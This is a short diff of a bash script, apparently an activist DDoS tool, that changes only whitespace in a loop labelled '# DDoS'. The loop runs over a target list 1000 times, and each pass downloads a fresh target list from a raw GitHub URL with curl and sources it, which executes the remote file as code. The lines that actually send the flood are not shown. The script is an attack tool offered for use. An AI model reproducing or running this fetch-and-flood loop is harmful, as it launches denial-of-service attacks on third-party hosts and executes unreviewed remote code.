@@ -4,9 +4,9 @@
 
 list=("${fucklist[@]}")
 
-for n in {1..1000}; do 
-    for (( i = 0; i < ${#list[@]}; i++ )) 
-        do
+for n in {1..1000}; do
+    for (( i = 0; i < ${#list[@]}; i++ ))
+    do
         
         # DDoS
         echo "Fucking - ${list[i]}"
@@ -22,7 +22,7 @@ for n in {1..1000}; do
         curl -LJO  https://raw.githubusercontent.com/v1adko/fuckputin/master/fucklist.sh
         sleep 1
         . ./fucklist.sh
-
+        
         #  If it's different from the current list - restart the queue
         if [ "${list[0]}" != "${fucklist[0]}" ]; then
             echo "Fetched new fucklist, restarting..."
